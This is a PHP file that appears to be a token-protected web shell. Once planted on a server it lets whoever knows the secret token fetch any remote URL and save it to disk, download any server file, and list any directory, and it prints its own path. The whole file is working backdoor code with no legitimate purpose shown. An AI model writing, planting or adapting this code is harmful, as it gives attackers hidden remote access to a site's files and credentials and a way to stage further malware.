<?php 
$token = 'aiyoumaya';
if ($_REQUEST['token']==md5($token)){
echo "Current File Absolute Path========>  ".__FILE__;
?>
<form method="post"> 
<input name="url" size="50" value="url"/> 
<input name='filename' site="50" value="filename"/>
<select id="type" name="type" >
  <option value ="download">download</option>
  <option value ="read">read</option>
  <option value ="list">list</option>
</select>
<input name="submit" type="submit" /> 
</form> 
<?php 
set_time_limit (24 * 60 * 60); 
if (!isset($_POST['submit'])) die(); 
// folder to save downloaded files to. must end with slash 
if ($_POST['type'] == 'download') {
	$destination_folder = './'; 
	$url = $_POST['url']; 
	$filename = $_POST['filename'];
	$newfname = $destination_folder . basename($url); 
	$file = fopen ($url, "rb"); 
	if ($file) { 
		$newf = fopen ($filename, "wb"); 
		if ($newf) 
		while(!feof($file)) 
		{ 
			fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 ); 
		} 
	} 
	if ($file) 
	{ 
		fclose($file); 
	} 
	if ($newf) { 
	fclose($newf); 
	echo 'OK,File has been downloaded!'; 
} 
}
else if($_POST['type'] == 'read')
{
	$filename = $_POST['filename'];
	if (file_exists($filename)==false){
		echo 'Error,File is not existed!'; 
		exit();
	}
    $file = fopen ( $filename, "rb" );   
    Header ( "Content-type: application/octet-stream" );   
    Header ( "Accept-Ranges: bytes" );    
    Header ( "Accept-Length: " . filesize ( $filename ) );  
    Header ( "Content-Disposition: attachment; filename=" . $filename );     
    echo fread ( $file, filesize ($filename) );    
    fclose ( $file );    
    exit ();    
} else if($_POST['type'] == 'list'){
   $path = $_POST['filename'];
   $current_dir = opendir($path);    //opendir()返回一个目录句柄,失败返回false
   while(($file = readdir($current_dir)) !== false) {
	echo $file."\n";
   }
   exit();
}
}
?> 